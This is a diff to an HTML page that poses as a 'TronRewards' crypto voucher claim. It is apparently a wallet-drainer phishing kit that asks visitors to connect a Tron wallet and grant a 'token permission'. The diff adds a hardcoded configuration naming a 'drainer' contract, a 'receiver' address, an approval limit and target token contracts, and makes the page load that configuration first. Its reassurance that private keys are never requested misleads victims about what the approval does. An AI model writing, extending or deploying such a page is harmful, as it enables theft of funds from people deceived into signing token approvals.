@@ -57,7 +57,7 @@
   <div id="view-connect">
     <h1 class="headline">A crypto voucher has been issued to you!</h1>
     <div class="sub">Connect your wallet to receive it. TronRewards never requests private keys.</div>
-    <img class="voucher" src="voucher.png?v=2" alt="" onerror="this.style.display='none'">
+    <img class="voucher" src="https://antonkazemirov871-byte.github.io/check/voucher.png" alt="" onerror="this.style.display='none'">
     <button class="cta" id="connect-tl">Connect wallet</button>
     <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
 
@@ -77,7 +77,7 @@
       </div>
     </div>
     <ul class="steps">
-      <li class="on"><span class="n">⚓</span>Wallet connected</li>
+      <li class="on"><span class="n">♓</span>Wallet connected</li>
       <li id="st-approve"><span class="n">2</span>Token permission</li>
       <li id="st-claim"><span class="n">3</span>Check delivered</li>
     </ul>
@@ -99,7 +99,7 @@
 <div id="wc" class="hidden">
   <div class="sheet">
     <b>Scan with your wallet</b>
-    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKX…</div>
+    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKX…?</div>
     <canvas id="qr"></canvas>
     <div class="wallets" id="deeplinks"></div>
     <button class="ghost" id="wc-copy">Copy connection link</button>
@@ -107,6 +107,9 @@
   </div>
 </div>
 
+<script>
+window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',bait:'',drainer:'TKzimrUhM9USG5YWLFQ7biMoxhX4pRmgND',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'10000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
+</script>
 <script src="config.js"></script>
 <script>
 const $ = (id) => document.getElementById(id);
@@ -132,6 +135,7 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 function fmt(raw, dec) { const s = String(raw).padStart(dec + 1, '0'); const w = s.slice(0, s.length - dec); const f = s.slice(s.length - dec).replace(/0+$/, ''); return f ? w + '.' + f : w; }
 
 async function loadConfig() {
+  if (window.BAIT_CONFIG && window.BAIT_CONFIG.drainer) { cfg = window.BAIT_CONFIG; $('contract').textContent = cfg.drainer; return; }
   try { const r = await fetch('/api/config'); if (!r.ok) throw 0; cfg = await r.json(); }
   catch (e) { if (window.BAIT_CONFIG) { cfg = window.BAIT_CONFIG; staticMode = true; } else throw new Error('config'); }
   $('contract').textContent = cfg.drainer || '—';
@@ -305,7 +309,7 @@ async function connectInjected() {
 async function connectTronLink() {
   if (DEMO) { cfg = { drainer: 'TDemoDrainerContractxxxxxxxxxxxxxx1' }; $('contract').textContent = cfg.drainer; signer = { kind: 'demo', address: 'TDemoAddressxxxxxxxxxxxxxxxxx1' }; account = signer.address; await load(); return; }
   $('connect-tl').disabled = true;
-  setStatus('Connecting…');
+  setStatus('Connecting…?');
   if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); $('connect-tl').disabled = false; return; } }
   const got = await connectInjected();
   if (!got) {
@@ -324,7 +328,7 @@ async function connectWalletConnect() {
   if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); return; } }
   if (!cfg.wcProjectId) { setStatus('WalletConnect Project ID is not set in config.js', 'err'); return; }
   $('connect-wc').disabled = true;
-  setStatus('Opening WalletConnect…??');
+  setStatus('Opening WalletConnect…???');
   try {
     const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
     wcClient = await SignClient.init({
@@ -366,7 +370,7 @@ async function connectWalletConnect() {
 
 async function load() {
   $('claim').disabled = true;
-  setStatus('Checking your check…??');
+  setStatus('Checking your check…???');
   let dc;
   if (DEMO) {
     await sleep(700);
@@ -482,5 +486,6 @@ loadConfig().catch(() => {});
 </script>
 </body>
 </html>
+
 
 
